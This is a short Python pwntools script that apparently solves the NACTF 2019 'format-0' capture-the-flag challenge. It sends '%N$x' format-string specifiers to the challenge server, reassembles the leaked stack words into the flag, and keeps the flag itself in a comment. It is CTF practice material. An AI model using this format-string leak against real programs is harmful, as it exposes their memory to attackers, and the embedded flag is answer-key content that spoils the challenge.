#!/usr/bin/env python

from pwn import *

# nactf{Pr1ntF_L34k_m3m0ry_r34d_nM05f469}

#r = process("./format-0")

r = remote("shell.2019.nactf.com", 31782)
r.recvuntil("Type something>")

payload = ""
for i in range(31, 40):
    payload += "%" + str(i) + "$x"

r.sendline(payload)
r.recvuntil("You typed: ")
data = r.recvall()

flag = ""
for i in range(0, 9):
    flag += data[i*8: i*8 + 8].decode('hex')[::-1]
    
r.close()

r = remote("shell.2019.nactf.com", 31782)
r.recvuntil("Type something>")
r.sendline("%40$x")
r.recvuntil("You typed: ")
data = r.recvall()[1:].strip().decode('hex')[::-1]
flag += data
r.close()

print(flag)
